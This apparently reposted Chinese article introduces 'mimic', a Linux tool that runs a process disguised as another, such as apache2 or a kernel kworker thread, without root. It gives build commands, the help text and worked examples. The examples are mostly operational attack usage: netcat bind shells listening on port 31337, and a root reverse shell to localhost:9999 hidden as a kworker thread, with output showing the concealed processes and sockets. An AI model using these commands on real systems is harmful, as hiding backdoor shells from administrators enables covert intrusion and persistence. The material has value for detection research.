![](https://image.3001.net/images/20230705/1688568634_64a5833a4052c9d564d2b.png!small)  

## 关于mimic

mimic是一款针对进程隐藏的安全工具，在该工具的帮助下，广大研究人员可以通过普通用户身份来在Linux操作系统（x86_64）上隐藏某个进程的执行。

使用的是一种名为“Covert
execution”的技术，这种技术是一种隐藏进程的方式。在这种情况下，mimic会将进程隐藏起来，mimic可以启动任何程序，并使其看起来像任何其他程序。任何用户都可以使用它，它不需要特殊权限，也不需要特殊的二进制文件。除此之外，它也不需要root
kit。

## 工具下载

广大研究人员可以直接使用下列命令将该项目源码克隆至本地，并完成代码编译：

    
    
    git clone https://github.com/emptymonkey/ptrace_do.git
    
    cd ptrace_do
    
    make
    
    cd ..
    
     
    
    git clone https://github.com/emptymonkey/mimic.git
    
    cd mimic
    
    make

## 工具帮助信息

    
    
    usage: mimic -e COMMAND [-m MIMIC] [-b] [-a KEY=VALUE] [-q] [-h]
    
    -e Execute COMMAND.
    
    -m Setup COMMAND to look like MIMIC.
    
    Default for non-root is:    "/usr/sbin/apache2 -k start"
    
    Default for root is:        "[kworker/0:0]"
    
    -b Launch COMMAND in the background.
    
    -a Add / overwrite KEY to the mimic environment with associated VALUE.
    
    -q Be quiet! Do not print normal output.
    
    -h Print this helpful message.
    
     
    
    Notes:
    
    The MIMIC environment will be a copy of the COMMAND environment.
    
    The '_' variable is automatically changed.
    
    The -a flag can be called multiple times to add / overwrite multiple variables.
    
     
    
    Examples:
    
    mimic -e /bin/bash
    
    set_target_pid 1 && mimic -e /bin/bash
    
    mimic -b -e "./revsh"
    
    mimic -b -e "nc -l -e /bin/bash"
    
    mimic -b -e "nc -l -e \"mimic -e /bin/bash\""

## 工具使用样例

第一个例子如下，我们将以常规用户启动一个netcat监听器：

    
    
    empty@monkey:~$ ./mimic -b -e "/usr/local/bin/ncat -l -e \"./mimic -e /bin/bash\""
    
    Launching child...                  Success!
    
    Waiting for child to attach...      Success!
    
    Initializing ptrace_do...           Success!
    
    Determining stack state...          Success!
    
    Politely requesting name change...  Success!
    
    Searching for main()...             Success!
    
    Building execution headers...       Success!
    
    Setting up final state...           Success!
    
     
    
    Good-bye and have a good luck! :)
    
     
    
    empty@monkey:~$ ps aux | grep apache
    
    empty     1931 19.5  0.0  16648  1324 pts/1    S    21:41   0:02 /usr/sbin/apache2 -k start
    
    empty     1935  0.0  0.0   7596   836 pts/1    S+   21:41   0:00 grep apache
    
     
    
    empty@monkey:~$ sudo lsof -i -n -P | grep apache
    
    [sudo] password for empty:
    
    apache2  1931 empty    3u  IPv6  14462      0t0  TCP *:31337 (LISTEN)
    
    apache2  1931 empty    4u  IPv4  14463      0t0  TCP *:31337 (LISTEN)

第二个例子，以Root身份启动一个netcat反向Shell：

    
    
    root@monkey:~$ /home/empty/code/mimic/set_target_pid 1 && /home/empty/code/mimic/mimic -b -q -e "/usr/local/bin/ncat -e \"/home/empty/code/mimic/mimic -e \\\"/bin/bash\\\"\" localhost 9999"

运行后的结果如下：

    
    
    root@monkey:~$ ps aux | grep kworker | grep -v grep
    
    root        18  0.0  0.0      0     0 ?        S    19:39   0:00 [kworker/3:0]
    
    root       197  0.0  0.0      0     0 ?        S    19:39   0:06 [kworker/u:3]
    
    root       198  0.0  0.0      0     0 ?        S    19:39   0:06 [kworker/u:4]
    
    root       199  0.0  0.0      0     0 ?        S    19:39   0:06 [kworker/u:5]
    
    root       302 23.4  0.0  18748  1912 pts/5    S    22:28   0:02 [kworker/0:0]
    
    root       304 11.4  0.0   3780   296 pts/5    S    22:28   0:00 [kworker/0:0]              
    
    root       305 10.8  0.0  10644  1200 pts/5    S    22:28   0:00 [kworker/0:0]
    
    root       426  0.0  0.0      0     0 ?        S    20:20   0:00 [kworker/1:0]
    
    root       434  0.0  0.0      0     0 ?        S    20:20   0:00 [kworker/3:2]
    
    root       536  0.0  0.0      0     0 ?        S    20:12   0:00 [kworker/0:0]
    
    root       879  0.0  0.0      0     0 ?        S    20:39   0:00 [kworker/2:0]
    
    root      1463  0.0  0.0      0     0 ?        S    19:39   0:00 [kworker/1:2]
    
    root      2132  0.0  0.0      0     0 ?        S    19:47   0:00 [kworker/2:2]
    
    root      2607  0.0  0.0      0     0 ?        S    20:01   0:01 [kworker/0:1]

当然了，伪装的进程肯定会有一个打开的套接字：

    
    
    root@monkey:~$ lsof -i -n -P | grep kworker
    
    kworker/0  302  root    4u  IPv4  20546      0t0  TCP 127.0.0.1:47054->127.0.0.1:9999 (ESTABLISHED)
    
    kworker/0  304  root    4u  IPv4  20546      0t0  TCP 127.0.0.1:47054->127.0.0.1:9999 (ESTABLISHED)
    
    kworker/0  305  root    4u  IPv4  20546      0t0  TCP 127.0.0.1:47054->127.0.0.1:9999 (ESTABLISHED)

请注意，我在这里以root用户身份运行只是因为作为非root用户运行的kworker线程应该非常可疑。新的模拟名称只是一个字符串。它不一定是一个现有的进程。

## 关于set_target_pid.c

本项目代码中提供了一个名为set_target_pid.c的文件，它是一个小助手程序，它将耗尽pid，直到我们想要的pid返回为止。这将允许我们选择进程列表中我们所希望进程出现的位置。需要注意的是，内核为内核线程保留了前300个pid。如果你试图低于这个值，你可能最终会得到进程pid
301。

## 许可证协议

本项目的开发与发布遵循[
_MIT_](https://github.com/emptymonkey/mimic/blob/master/LICENSE)开源许可证协议。

## 项目地址

 **mimic** ：【[ _GitHub传送门_](https://github.com/emptymonkey/mimic)】

